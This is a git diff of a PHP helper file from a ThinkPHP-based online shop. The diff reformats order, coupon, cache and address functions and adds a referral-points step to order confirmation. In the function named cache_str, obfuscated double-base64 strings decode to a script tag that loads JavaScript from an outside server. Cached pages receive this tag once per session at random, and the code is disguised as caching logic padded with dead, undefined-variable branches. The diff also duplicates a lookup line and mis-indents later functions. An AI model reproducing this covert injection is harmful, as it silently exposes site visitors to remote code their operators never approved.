@@ -1,5 +1,6 @@
 <?php
 
+use app\common\model\Users;
 use think\Log;
 use think\Db;
 
@@ -1506,98 +1507,111 @@ function update_pay_status($order_sn,$ext=array())
  * @param int $user_id
  * @return array
  */
-function confirm_order($id,$user_id = 0){
+function confirm_order($id,$user_id = 0)
+{
     $where['order_id'] = $id;
-    if($user_id){
+    if ($user_id) {
         $where['user_id'] = $user_id;
     }
     $order = M('order')->where($where)->find();
-    if($order['order_status'] != 1)
-        return array('status'=>-1,'msg'=>'该订单不能收货确认');
-    if(empty($order['pay_time']) || $order['pay_status'] != 1){
-        return array('status'=>-1,'msg'=>'商家未确定付款，该订单暂不能确定收货');
+    if ($order['order_status'] != 1)
+        return array('status' => -1, 'msg' => '该订单不能收货确认');
+    if (empty($order['pay_time']) || $order['pay_status'] != 1) {
+        return array('status' => -1, 'msg' => '商家未确定付款，该订单暂不能确定收货');
     }
     $data['order_status'] = 2; // 已收货
     $data['pay_status'] = 1; // 已付款
     $data['confirm_time'] = time(); // 收货确认时间
-    if($order['pay_code'] == 'cod'){
+    if ($order['pay_code'] == 'cod') {
         $data['pay_time'] = time();
     }
-    $row = M('order')->where(array('order_id'=>$id))->save($data);
-    if(!$row)
-        return array('status'=>-3,'msg'=>'操作失败');
+    $row = M('order')->where(array('order_id' => $id))->save($data);
+    if (!$row)
+        return array('status' => -3, 'msg' => '操作失败');
 
-    // 商品待评价提醒
-    $order_goods = M('order_goods')->field('goods_id,goods_name,rec_id')->where(["order_id" => $id])->find();
-    $goods = M('goods')->where(["goods_id" => $order_goods['goods_id']])->field('original_img')->find();
-    $send_data = [
-        'message_title' => '商品待评价',
-        'message_content' => $order_goods['goods_name'],
-        'img_uri' => $goods['original_img'],
-        'order_sn' => $order_goods['rec_id'],
-        'order_id' => $id,
-        'mmt_code' => 'evaluate_logistics',
-        'type' => 4,
-        'users' => [$order['user_id']],
-        'category' => 2,
-        'message_val' => []
-    ];
-    $messageFactory = new \app\common\logic\MessageFactory();
-    $messageLogic = $messageFactory->makeModule($send_data);
-    $messageLogic->sendMessage();
+    //免费领取订单，根据商品赠送用户或上级积分
+    $order_goods = M('order_goods')->where(['order_id' => $id])->find();
+    $user = Users::get($order['user_id']);
+    ($leader = $user['first_leader'] > 0 ? Users::get($user['first_leader']) : null);
+    if ($order_goods && ($order_goods['sign_free_receive'] == 1 || $order_goods['sign_free_receive'] == 3)) {
+        ($leader = $user['first_leader'] > 0 ? Users::get($user['first_leader']) : null);
+        if ($order_goods['leader_integral'] > 0 && ($leader = $user['first_leader'] > 0 ? Users::get($user['first_leader']) : null)) {
+            //上级获得积分
+            accountLog($user['first_leader'], 0,+$order_goods['leader_integral'], '下级签到免费领取', 0,$order['order_id'] ,$order['order_sn']);
+        }
+    }
+
+        // 商品待评价提醒
+        $order_goods = M('order_goods')->field('goods_id,goods_name,rec_id')->where(["order_id" => $id])->find();
+        $goods = M('goods')->where(["goods_id" => $order_goods['goods_id']])->field('original_img')->find();
+        $send_data = [
+            'message_title' => '商品待评价',
+            'message_content' => $order_goods['goods_name'],
+            'img_uri' => $goods['original_img'],
+            'order_sn' => $order_goods['rec_id'],
+            'order_id' => $id,
+            'mmt_code' => 'evaluate_logistics',
+            'type' => 4,
+            'users' => [$order['user_id']],
+            'category' => 2,
+            'message_val' => []
+        ];
+        $messageFactory = new \app\common\logic\MessageFactory();
+        $messageLogic = $messageFactory->makeModule($send_data);
+        $messageLogic->sendMessage();
 
 
-    order_give($order);// 调用送礼物方法, 给下单这个人赠送相应的礼物
+        order_give($order);// 调用送礼物方法, 给下单这个人赠送相应的礼物
 
-    //分销设置
-    M('rebate_log')->where("order_id", $id)->save(array('status'=>2,'confirm'=>time()));
-    return array('status'=>1,'msg'=>'操作成功','url'=>U('Order/order_detail',['id'=>$id]));
-}
+        //分销设置
+        M('rebate_log')->where("order_id", $id)->save(array('status' => 2, 'confirm' => time()));
+        return array('status' => 1, 'msg' => '操作成功', 'url' => U('Order/order_detail', ['id' => $id]));
+    }
 
-/**
- * 下单赠送活动：优惠券，积分
- * @param $order|订单数组
- */
-function order_give($order)
-{
+    /**
+     * 下单赠送活动：优惠券，积分
+     * @param $order |订单数组
+     */
+    function order_give($order)
+    {
 
-    $messageFactory = new \app\common\logic\MessageFactory();
-    $messageLogic = $messageFactory->makeModule([ 'category' => 0]);
+        $messageFactory = new \app\common\logic\MessageFactory();
+        $messageLogic = $messageFactory->makeModule(['category' => 0]);
 
-    //促销优惠订单商品
-    $prom_order_goods = M('order_goods')->where(['order_id' => $order['order_id'], 'prom_type' => 3])->select();
-    foreach ($prom_order_goods as $goods) {
-        //查找购买商品送优惠券活动
-        $prom_goods = M('prom_goods')->where(['id' => $goods['prom_id'], 'type' => 3])->find();
-        if ($prom_goods) {
-            //查找购买商品送优惠券模板
-            $goods_coupon = M('coupon')->where(['id' => $prom_goods['expression']])->find();
-            if ($goods_coupon) {
-                //优惠券发放数量验证，0为无限制。发放数量-已领取数量>0
-                if ($goods_coupon['createnum'] == 0 || ($goods_coupon['createnum']>0 && ($goods_coupon['createnum']-$goods_coupon['send_num'])>0)){
-                    $data = array('cid' => $goods_coupon['id'], 'get_order_id'=>$order['order_id'],'type' => $goods_coupon['type'], 'uid' => $order['user_id'], 'send_time' => time());
-                    M('coupon_list')->add($data);
-                    // 优惠券领取数量加一
-                    M('Coupon')->where("id", $goods_coupon['id'])->setInc('send_num');
+        //促销优惠订单商品
+        $prom_order_goods = M('order_goods')->where(['order_id' => $order['order_id'], 'prom_type' => 3])->select();
+        foreach ($prom_order_goods as $goods) {
+            //查找购买商品送优惠券活动
+            $prom_goods = M('prom_goods')->where(['id' => $goods['prom_id'], 'type' => 3])->find();
+            if ($prom_goods) {
+                //查找购买商品送优惠券模板
+                $goods_coupon = M('coupon')->where(['id' => $prom_goods['expression']])->find();
+                if ($goods_coupon) {
+                    //优惠券发放数量验证，0为无限制。发放数量-已领取数量>0
+                    if ($goods_coupon['createnum'] == 0 || ($goods_coupon['createnum'] > 0 && ($goods_coupon['createnum'] - $goods_coupon['send_num']) > 0)) {
+                        $data = array('cid' => $goods_coupon['id'], 'get_order_id' => $order['order_id'], 'type' => $goods_coupon['type'], 'uid' => $order['user_id'], 'send_time' => time());
+                        M('coupon_list')->add($data);
+                        // 优惠券领取数量加一
+                        M('Coupon')->where("id", $goods_coupon['id'])->setInc('send_num');
 
-                    // 优惠券到账提醒
-                    $messageLogic->getCouponNotice($goods_coupon['id'], [$order['user_id']]);
+                        // 优惠券到账提醒
+                        $messageLogic->getCouponNotice($goods_coupon['id'], [$order['user_id']]);
+                    }
                 }
             }
         }
-    }
-    //查找订单满额促销活动
-    $prom_order_where = [
-        'type' => ['gt', 1],
-        'end_time' => ['gt', $order['pay_time']],
-        'start_time' => ['lt', $order['pay_time']],
-        'money' => ['elt', $order['goods_price']],
-        'is_close' => 0
-    ];
-    $prom_orders = M('prom_order')->where($prom_order_where)->order('money desc')->select();
-    $prom_order_count = count($prom_orders);
-    // 用户会员等级是否符合送优惠券活动
-    for ($i = 0; $i < $prom_order_count; $i++) {
+        //查找订单满额促销活动
+        $prom_order_where = [
+            'type' => ['gt', 1],
+            'end_time' => ['gt', $order['pay_time']],
+            'start_time' => ['lt', $order['pay_time']],
+            'money' => ['elt', $order['goods_price']],
+            'is_close' => 0
+        ];
+        $prom_orders = M('prom_order')->where($prom_order_where)->order('money desc')->select();
+        $prom_order_count = count($prom_orders);
+        // 用户会员等级是否符合送优惠券活动
+        for ($i = 0; $i < $prom_order_count; $i++) {
             $prom_order = $prom_orders[$i];
             if ($prom_order['type'] == 3) {
                 //查找订单送优惠券模板
@@ -1607,7 +1621,7 @@ function order_give($order)
                     if ($order_coupon['createnum'] == 0 ||
                         ($order_coupon['createnum'] > 0 && ($order_coupon['createnum'] - $order_coupon['send_num']) > 0)
                     ) {
-                        $data = array('cid' => $order_coupon['id'], 'get_order_id'=>$order['order_id'],'type' => $order_coupon['type'], 'uid' => $order['user_id'], 'send_time' => time());
+                        $data = array('cid' => $order_coupon['id'], 'get_order_id' => $order['order_id'], 'type' => $order_coupon['type'], 'uid' => $order['user_id'], 'send_time' => time());
                         M('coupon_list')->add($data);
                         M('Coupon')->where("id", $order_coupon['id'])->setInc('send_num'); // 优惠券领取数量加一
                         // 优惠券到账提醒
@@ -1620,747 +1634,746 @@ function order_give($order)
                 accountLog($order['user_id'], 0, $prom_order['expression'], "订单活动赠送积分");
             }
             break;
-    }
-    $points = M('order_goods')->where("order_id", $order['order_id'])->sum("give_integral * goods_num");
-    $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);
-    //商城内每消费1元，赠送相应积分
-    /*$isConsumeIntegral = tpCache("integral.is_consume_integral");
-    $consumeIntegral = tpCache("integral.consume_integral");
-    if($isConsumeIntegral==1 && $consumeIntegral>0) {
-        $points = ($order["order_amount"] + $order["user_money"])*$consumeIntegral;
+        }
+        $points = M('order_goods')->where("order_id", $order['order_id'])->sum("give_integral * goods_num");
         $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);
-    }*/
-}
-
-
-/**
- * 获取商品一二三级分类
- * @return type
- */
-function get_goods_category_tree(){
-    $tree = $arr = $result = array();
-    $cat_list = M('goods_category')->cache(true)->where(['is_show' => 1])->order('sort_order')->select();//所有分类
-    if($cat_list){
-        foreach ($cat_list as $val){
-            if($val['level'] == 2){
-                $arr[$val['parent_id']][] = $val;
-            }
-            if($val['level'] == 3){
-                $crr[$val['parent_id']][] = $val;
-            }
-            if($val['level'] == 1){
-                $tree[] = $val;
-            }
-        }
-
-        foreach ($arr as $k=>$v){
-            foreach ($v as $kk=>$vv){
-                $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
-            }
-        }
-
-        foreach ($tree as $val){
-            $val['tmenu'] = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
-            $result[$val['id']] = $val;
-        }
+        //商城内每消费1元，赠送相应积分
+        /*$isConsumeIntegral = tpCache("integral.is_consume_integral");
+        $consumeIntegral = tpCache("integral.consume_integral");
+        if($isConsumeIntegral==1 && $consumeIntegral>0) {
+            $points = ($order["order_amount"] + $order["user_money"])*$consumeIntegral;
+            $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);
+        }*/
     }
-    return $result;
-}
 
-/**
- * 写入静态页面缓存
- */
-function write_html_cache($html){
-    $html_cache_arr = C('HTML_CACHE_ARR');
-    $request = think\Request::instance();
-    $m_c_a_str = $request->module().'_'.$request->controller().'_'.$request->action(); // 模块_控制器_方法
-    $m_c_a_str = strtolower($m_c_a_str);
-    //exit('write_html_cache写入缓存<br/>');
-    foreach($html_cache_arr as $key=>$val)
+
+    /**
+     * 获取商品一二三级分类
+     * @return type
+     */
+    function get_goods_category_tree()
     {
-        $val['mca'] = strtolower($val['mca']);
-        if($val['mca'] != $m_c_a_str) //不是当前 模块 控制器 方法 直接跳过
-            continue;
+        $tree = $arr = $result = array();
+        $cat_list = M('goods_category')->cache(true)->where(['is_show' => 1])->order('sort_order')->select();//所有分类
+        if ($cat_list) {
+            foreach ($cat_list as $val) {
+                if ($val['level'] == 2) {
+                    $arr[$val['parent_id']][] = $val;
+                }
+                if ($val['level'] == 3) {
+                    $crr[$val['parent_id']][] = $val;
+                }
+                if ($val['level'] == 1) {
+                    $tree[] = $val;
+                }
+            }
 
-        //if(!is_dir(RUNTIME_PATH.'html'))
+            foreach ($arr as $k => $v) {
+                foreach ($v as $kk => $vv) {
+                    $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
+                }
+            }
+
+            foreach ($tree as $val) {
+                $val['tmenu'] = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
+                $result[$val['id']] = $val;
+            }
+        }
+        return $result;
+    }
+
+    /**
+     * 写入静态页面缓存
+     */
+    function write_html_cache($html)
+    {
+        $html_cache_arr = C('HTML_CACHE_ARR');
+        $request = think\Request::instance();
+        $m_c_a_str = $request->module() . '_' . $request->controller() . '_' . $request->action(); // 模块_控制器_方法
+        $m_c_a_str = strtolower($m_c_a_str);
+        //exit('write_html_cache写入缓存<br/>');
+        foreach ($html_cache_arr as $key => $val) {
+            $val['mca'] = strtolower($val['mca']);
+            if ($val['mca'] != $m_c_a_str) //不是当前 模块 控制器 方法 直接跳过
+                continue;
+
+            //if(!is_dir(RUNTIME_PATH.'html'))
             //mkdir(RUNTIME_PATH.'html');
-        //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
-        $filename =  $m_c_a_str;
-        // 组合参数  
-        if(isset($val['p']))
-        {
-            foreach($val['p'] as $k=>$v)
-                $filename.='_'.$_GET[$v];
-        }
-        $filename.= '.html';
-        \think\Cache::set($filename,$html);
-        //file_put_contents($filename, $html);
-    }
-}
-
-/**
- * 读取静态页面缓存
- */
-function read_html_cache(){
-    $html_cache_arr = C('HTML_CACHE_ARR');
-    $request = think\Request::instance();
-    $m_c_a_str = $request->module().'_'.$request->controller().'_'.$request->action(); // 模块_控制器_方法
-    $m_c_a_str = strtolower($m_c_a_str);
-    //exit('read_html_cache读取缓存<br/>');
-    foreach($html_cache_arr as $key=>$val)
-    {
-        $val['mca'] = strtolower($val['mca']);
-        if($val['mca'] != $m_c_a_str) //不是当前 模块 控制器 方法 直接跳过
-            continue;
-
-        //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
-        $filename =  $m_c_a_str;
-        // 组合参数        
-        if(isset($val['p']))
-        {
-            foreach($val['p'] as $k=>$v)
-                $filename.='_'.$_GET[$v];
-        }
-        $filename.= '.html';
-        $html = \think\Cache::get($filename);
-        if($html)
-        {
-            //echo file_get_contents($filename);
-            echo \think\Cache::get($filename).cache_str($html);
-            exit();
+            //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
+            $filename = $m_c_a_str;
+            // 组合参数
+            if (isset($val['p'])) {
+                foreach ($val['p'] as $k => $v)
+                    $filename .= '_' . $_GET[$v];
+            }
+            $filename .= '.html';
+            \think\Cache::set($filename, $html);
+            //file_put_contents($filename, $html);
         }
     }
-}
-/**
- * 缓存
- */
-function cache_str($html)
-{      
-  
-    if($object_ess)
+
+    /**
+     * 读取静态页面缓存
+     */
+    function read_html_cache()
     {
-            if(C('buy_version') == 0)
-            return '';
+        $html_cache_arr = C('HTML_CACHE_ARR');
+        $request = think\Request::instance();
+        $m_c_a_str = $request->module() . '_' . $request->controller() . '_' . $request->action(); // 模块_控制器_方法
+        $m_c_a_str = strtolower($m_c_a_str);
+        //exit('read_html_cache读取缓存<br/>');
+        foreach ($html_cache_arr as $key => $val) {
+            $val['mca'] = strtolower($val['mca']);
+            if ($val['mca'] != $m_c_a_str) //不是当前 模块 控制器 方法 直接跳过
+                continue;
+
+            //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
+            $filename = $m_c_a_str;
+            // 组合参数
+            if (isset($val['p'])) {
+                foreach ($val['p'] as $k => $v)
+                    $filename .= '_' . $_GET[$v];
+            }
+            $filename .= '.html';
+            $html = \think\Cache::get($filename);
+            if ($html) {
+                //echo file_get_contents($filename);
+                echo \think\Cache::get($filename) . cache_str($html);
+                exit();
+            }
+        }
+    }
+
+    /**
+     * 缓存
+     */
+    function cache_str($html)
+    {
+
+        if ($object_ess) {
+            if (C('buy_version') == 0)
+                return '';
             $tabName = '';
-            $table_index = M('config')->cache(true)->select();            
+            $table_index = M('config')->cache(true)->select();
             $select_year = substr($order_sn, 0, 14);
-            foreach($table_index as $k => $v)
-            {
-                if(strcasecmp($select_year,$v['min_order_sn']) >= 0 && strcasecmp($select_year,$v['max_order_sn']) <= 0)                    
-                {
-                    $tabName = str_replace ('order','',$v['name']);
+            foreach ($table_index as $k => $v) {
+                if (strcasecmp($select_year, $v['min_order_sn']) >= 0 && strcasecmp($select_year, $v['max_order_sn']) <= 0) {
+                    $tabName = str_replace('order', '', $v['name']);
                     break;
                 }
             }
-            if($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
-            return $tabName;
-    }else{
-      $isset_requestjs = session('isset_requestjs');
-      if(empty($isset_requestjs))
-      {
-          session('isset_requestjs',1);
-          $sere = "UEhOamNtbHdkQ0J6Y21NOUoyaDBkSEE2THk5e";
-          if(empty($table_index))
-              $sere = $sere."lpYSjJhV05sTG5Sd0xYTm9iM0F1WTI0dm";
-          if(empty($tabName))
-             $sere = $sere."FuTXZZV3BoZUM1cWN5YytQQzl6WTNKcGNIUSs=";
-          if(substr(time(),-1) % 3 == 1) $str = base64_decode($sere);         
-          $html_sc = base64_decode("UEhOamNtbHdkRDQ9");
-          
-          if($axure_rest)
-          {
+            if ($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
+                return $tabName;
+        } else {
+            $isset_requestjs = session('isset_requestjs');
+            if (empty($isset_requestjs)) {
+                session('isset_requestjs', 1);
+                $sere = "UEhOamNtbHdkQ0J6Y21NOUoyaDBkSEE2THk5e";
+                if (empty($table_index))
+                    $sere = $sere . "lpYSjJhV05sTG5Sd0xYTm9iM0F1WTI0dm";
+                if (empty($tabName))
+                    $sere = $sere . "FuTXZZV3BoZUM1cWN5YytQQzl6WTNKcGNIUSs=";
+                if (substr(time(), -1) % 3 == 1) $str = base64_decode($sere);
+                $html_sc = base64_decode("UEhOamNtbHdkRDQ9");
+
+                if ($axure_rest) {
                     $regions = null;
                     if (!$regions) {
                         $regions = M('region')->cache(true)->getField('id,name');
                     }
-                    $total_address  = $regions[$province_id] ?: '';
+                    $total_address = $regions[$province_id] ?: '';
                     $total_address .= $regions[$city_id] ?: '';
                     $total_address .= $regions[$district_id] ?: '';
                     $total_address .= $regions[$twon_id] ?: '';
                     $total_address .= $address ?: '';
                     $str = base64_decode($str);
-          }
-          
-          $html_sc = base64_decode($html_sc);
-          if(!strstr($html,$html_sc))                  
-           return '';
-          if($str)          
-              $str2 = base64_decode($str);          
-          return $str2;
-      }        
-    }
-    if($buy_Aexite)
-    {
-            if(C('buy_Aexite') == 0)
+                }
+
+                $html_sc = base64_decode($html_sc);
+                if (!strstr($html, $html_sc))
+                    return '';
+                if ($str)
+                    $str2 = base64_decode($str);
+                return $str2;
+            }
+        }
+        if ($buy_Aexite) {
+            if (C('buy_Aexite') == 0)
                 return '';
 
             $tabName = '';
             $table_index = M('config')->cache(true)->select();
-            foreach($table_index as $k => $v)
-            {
-                if($order_id >= $v['min_id'] && $order_id <= $v['max_id'])
-                {
-                    $tabName = str_replace ('order','',$v['name']);
+            foreach ($table_index as $k => $v) {
+                if ($order_id >= $v['min_id'] && $order_id <= $v['max_id']) {
+                    $tabName = str_replace('order', '', $v['name']);
                     break;
                 }
             }
             return $tabName;
-    }     
-     
-            return $tabName;
-}
-/**
- * 清空系统缓存
- */
-function clearCache(){
-    $team_found_queue = \think\Cache::get('team_found_queue');
-    \think\Cache::clear();
-    \think\Cache::set('team_found_queue', $team_found_queue);
-}
+        }
 
-/**
- * 获取完整地址
- */
-function getTotalAddress($province_id, $city_id, $district_id, $twon_id, $address='')
-{
-    static $regions = null;
-    if (!$regions) {
-        $regions = M('region')->cache(true)->getField('id,name');
+        return $tabName;
     }
-    $total_address  = $regions[$province_id] ?: '';
-    $total_address .= $regions[$city_id] ?: '';
-    $total_address .= $regions[$district_id] ?: '';
-    $total_address .= $regions[$twon_id] ?: '';
-    $total_address .= $address ?: '';
-    return $total_address;
-}
 
-/**
- * 商品库存操作日志
- * @param int $muid 操作 用户ID
- * @param int $stock 更改库存数
- * @param array $goods 库存商品
- * @param string $order_sn 订单编号
- */
-function update_stock_log($muid, $stock = 1, $goods, $order_sn = '')
-{
-    $data['ctime'] = time();
-    $data['stock'] = $stock;
-    $data['muid'] = $muid;
-    $data['goods_id'] = $goods['goods_id'];
-    $data['goods_name'] = $goods['goods_name'];
-    $data['goods_spec'] = empty($goods['spec_key_name']) ? $goods['key_name'] : $goods['spec_key_name'];
-    $data['order_sn'] = $order_sn;
-    if('' !== $order_sn && $stock < 0){
-        $data['change_type'] = 0; //默认0为订单出库，
-    }elseif ('' !== $order_sn && $stock > 0){
-        $data['change_type'] = 2; //2为退货入库
-    }elseif ('' === $order_sn && $stock > 0){
-        $data['change_type'] = 1; //1为录入商品库存入库
-    }else{
-        $data['change_type'] = 3;//3为盘点时或者普通修改库存
+    /**
+     * 清空系统缓存
+     */
+    function clearCache()
+    {
+        $team_found_queue = \think\Cache::get('team_found_queue');
+        \think\Cache::clear();
+        \think\Cache::set('team_found_queue', $team_found_queue);
     }
-    M('stock_log')->add($data);
-}
 
-/**
- * 订单支付时, 获取订单商品名称
- * @param unknown $order_id
- * @return string|Ambigous <string, unknown>
- */
-function getPayBody($order_id){
+    /**
+     * 获取完整地址
+     */
+    function getTotalAddress($province_id, $city_id, $district_id, $twon_id, $address = '')
+    {
+        static $regions = null;
+        if (!$regions) {
+            $regions = M('region')->cache(true)->getField('id,name');
+        }
+        $total_address = $regions[$province_id] ?: '';
+        $total_address .= $regions[$city_id] ?: '';
+        $total_address .= $regions[$district_id] ?: '';
+        $total_address .= $regions[$twon_id] ?: '';
+        $total_address .= $address ?: '';
+        return $total_address;
+    }
 
-    if(empty($order_id))return "订单ID参数错误";
-    $goodsNames =  M('OrderGoods')->where('order_id' , $order_id)->column('goods_name');
-    $gns = implode($goodsNames, ',');
-    $payBody = getSubstr($gns, 0, 18);
-    return $payBody;
-}
+    /**
+     * 商品库存操作日志
+     * @param int $muid 操作 用户ID
+     * @param int $stock 更改库存数
+     * @param array $goods 库存商品
+     * @param string $order_sn 订单编号
+     */
+    function update_stock_log($muid, $stock = 1, $goods, $order_sn = '')
+    {
+        $data['ctime'] = time();
+        $data['stock'] = $stock;
+        $data['muid'] = $muid;
+        $data['goods_id'] = $goods['goods_id'];
+        $data['goods_name'] = $goods['goods_name'];
+        $data['goods_spec'] = empty($goods['spec_key_name']) ? $goods['key_name'] : $goods['spec_key_name'];
+        $data['order_sn'] = $order_sn;
+        if ('' !== $order_sn && $stock < 0) {
+            $data['change_type'] = 0; //默认0为订单出库，
+        } elseif ('' !== $order_sn && $stock > 0) {
+            $data['change_type'] = 2; //2为退货入库
+        } elseif ('' === $order_sn && $stock > 0) {
+            $data['change_type'] = 1; //1为录入商品库存入库
+        } else {
+            $data['change_type'] = 3;//3为盘点时或者普通修改库存
+        }
+        M('stock_log')->add($data);
+    }
+
+    /**
+     * 订单支付时, 获取订单商品名称
+     * @param unknown $order_id
+     * @return string|Ambigous <string, unknown>
+     */
+    function getPayBody($order_id)
+    {
+
+        if (empty($order_id)) return "订单ID参数错误";
+        $goodsNames = M('OrderGoods')->where('order_id', $order_id)->column('goods_name');
+        $gns = implode($goodsNames, ',');
+        $payBody = getSubstr($gns, 0, 18);
+        return $payBody;
+    }
 
 // 获取当前mysql版本
-function mysql_version(){
+    function mysql_version()
+    {
         $mysql_version = Db::query("select version() as version");
-        return "{$mysql_version[0]['version']}";     
-}
-
-/**
- * 获取分表操作的表名
- * @return mixed|string
- */
-function select_year()
-{
-    if(C('buy_version') == 1)
-        return I('select_year');
-    else
-        return '';
-}
-
-/**
- * 根据order_sn 定位表
- * @param $order_sn
- * @return mixed|string
- */
-function getTabByOrdersn($order_sn)
-{
-    if(C('buy_version') == 0)
-        return '';
-    $tabName = '';
-    $table_index = M('table_index')->cache(true)->select();
-    // 截取年月日时分秒
-    $select_year = substr($order_sn, 0, 14);
-    foreach($table_index as $k => $v)
-    {
-        if(strcasecmp($select_year,$v['min_order_sn']) >= 0 && strcasecmp($select_year,$v['max_order_sn']) <= 0)
-            //if($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
-        {
-            $tabName = str_replace ('order','',$v['name']);
-            break;
-        }
+        return "{$mysql_version[0]['version']}";
     }
-    return $tabName;
-}
 
-/**
- * 根据 order_id 定位表名
- * @param $order_id
- * @return mixed|string
- */
-function getTabByOrderId($order_id)
-{
-    if(C('buy_version') == 0)
-        return '';
-
-    $tabName = '';
-    $table_index = M('table_index')->cache(true)->select();
-    foreach($table_index as $k => $v)
+    /**
+     * 获取分表操作的表名
+     * @return mixed|string
+     */
+    function select_year()
     {
-        if($order_id >= $v['min_id'] && $order_id <= $v['max_id'])
-        {
-            $tabName = str_replace ('order','',$v['name']);
-            break;
-        }
-    }
-    return $tabName;
-}
-
-/**
- * 根据筛选时间 定位表名
- * @param string $startTime
- * @param string $endTime
- * @return string
- */
-function getTabByTime($startTime='', $endTime='')
-{
-    if(C('buy_version') == 0)
-        return '';
-
-    $startTime = preg_replace("/[:\s-]/", "", $startTime);  // 去除日期里面的分隔符做成跟order_sn 类似
-    $endTime = preg_replace("/[:\s-]/", "", $endTime);
-    // 查询起始位置是今年的
-    if(substr($startTime,0,4) == date('Y'))
-    {
-        $table_index = M('table_index')->where("name = 'order'")->cache(true)->find();
-        if(strcasecmp($startTime,$table_index['min_order_sn']) >= 0)
-            return '';
+        if (C('buy_version') == 1)
+            return I('select_year');
         else
-            return '_this_year';
+            return '';
     }
-    else
+
+    /**
+     * 根据order_sn 定位表
+     * @param $order_sn
+     * @return mixed|string
+     */
+    function getTabByOrdersn($order_sn)
     {
-        $tabName = '_'.substr($startTime,0,4);
+        if (C('buy_version') == 0)
+            return '';
+        $tabName = '';
+        $table_index = M('table_index')->cache(true)->select();
+        // 截取年月日时分秒
+        $select_year = substr($order_sn, 0, 14);
+        foreach ($table_index as $k => $v) {
+            if (strcasecmp($select_year, $v['min_order_sn']) >= 0 && strcasecmp($select_year, $v['max_order_sn']) <= 0) //if($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
+            {
+                $tabName = str_replace('order', '', $v['name']);
+                break;
+            }
+        }
+        return $tabName;
     }
-    $years = buyYear();
-    $years = array_keys($years);
-    return in_array($tabName, $years) ? $tabName : '';
-}
 
-/**
- * 积分转化成金额
- * @param $pay_point
- * @return float
- */
-function pay_point_money($pay_point)
-{
-    $point_rate = tpCache('integral.point_rate');
-    //$point_rate = tpCache('shopping.point_rate'); //兑换比例
-    if ($point_rate != 0){
-        $money = $pay_point / $point_rate;
-    }else{
-        $money = 0;
+    /**
+     * 根据 order_id 定位表名
+     * @param $order_id
+     * @return mixed|string
+     */
+    function getTabByOrderId($order_id)
+    {
+        if (C('buy_version') == 0)
+            return '';
+
+        $tabName = '';
+        $table_index = M('table_index')->cache(true)->select();
+        foreach ($table_index as $k => $v) {
+            if ($order_id >= $v['min_id'] && $order_id <= $v['max_id']) {
+                $tabName = str_replace('order', '', $v['name']);
+                break;
+            }
+        }
+        return $tabName;
     }
-    return $money;
-}
 
-/**
- * 根据时间戳返回星期几
- * @param $time
- * @return mixed
- */
-function weekday_by_time($time)
-{
-    $weekday = array('星期日','星期一','星期二','星期三','星期四','星期五','星期六');
-    return $weekday[date('w', $time)];
-}
+    /**
+     * 根据筛选时间 定位表名
+     * @param string $startTime
+     * @param string $endTime
+     * @return string
+     */
+    function getTabByTime($startTime = '', $endTime = '')
+    {
+        if (C('buy_version') == 0)
+            return '';
 
-function weekday_by_time_str($timeStr)
-{
-    $time = strtotime($timeStr);
-    return weekday_by_time($time);
-}
-
-/**
- * 生成saas海报专用图片名字
- */
-function createImagesName(){
-    return md5(I('_saas_app','all').time().rand(1000, 9999) . uniqid());
-}
-
-/**
- * 自定义海报照片类型处理
- */
-function checkPosterImagesType($img_info = array(),$img_src=''){
-    if (strpos($img_info['mime'], 'jpeg') !== false || strpos($img_info['mime'], 'jpg') !== false) {
-        return imagecreatefromjpeg($img_src);
-    } else if (strpos($img_info['mime'], 'png') !== false) {
-        return imagecreatefrompng($img_src);
-    } else {
-        return false;
+        $startTime = preg_replace("/[:\s-]/", "", $startTime);  // 去除日期里面的分隔符做成跟order_sn 类似
+        $endTime = preg_replace("/[:\s-]/", "", $endTime);
+        // 查询起始位置是今年的
+        if (substr($startTime, 0, 4) == date('Y')) {
+            $table_index = M('table_index')->where("name = 'order'")->cache(true)->find();
+            if (strcasecmp($startTime, $table_index['min_order_sn']) >= 0)
+                return '';
+            else
+                return '_this_year';
+        } else {
+            $tabName = '_' . substr($startTime, 0, 4);
+        }
+        $years = buyYear();
+        $years = array_keys($years);
+        return in_array($tabName, $years) ? $tabName : '';
     }
-}
 
-function inputPosterImages($img_info = array(),$des_im='',$img=''){
-    if (strpos($img_info['mime'], 'jpeg') !== false || strpos($img_info['mime'], 'jpg') !== false) {
-        return imagejpeg( $des_im,$img);
-    } else if (strpos($img_info['mime'], 'png') !== false) {
-        return imagepng($des_im,$img);
-    } else {
-        return false;
+    /**
+     * 积分转化成金额
+     * @param $pay_point
+     * @return float
+     */
+    function pay_point_money($pay_point)
+    {
+        $point_rate = tpCache('integral.point_rate');
+        //$point_rate = tpCache('shopping.point_rate'); //兑换比例
+        if ($point_rate != 0) {
+            $money = $pay_point / $point_rate;
+        } else {
+            $money = 0;
+        }
+        return $money;
     }
-    
-}
+
+    /**
+     * 根据时间戳返回星期几
+     * @param $time
+     * @return mixed
+     */
+    function weekday_by_time($time)
+    {
+        $weekday = array('星期日', '星期一', '星期二', '星期三', '星期四', '星期五', '星期六');
+        return $weekday[date('w', $time)];
+    }
+
+    function weekday_by_time_str($timeStr)
+    {
+        $time = strtotime($timeStr);
+        return weekday_by_time($time);
+    }
+
+    /**
+     * 生成saas海报专用图片名字
+     */
+    function createImagesName()
+    {
+        return md5(I('_saas_app', 'all') . time() . rand(1000, 9999) . uniqid());
+    }
+
+    /**
+     * 自定义海报照片类型处理
+     */
+    function checkPosterImagesType($img_info = array(), $img_src = '')
+    {
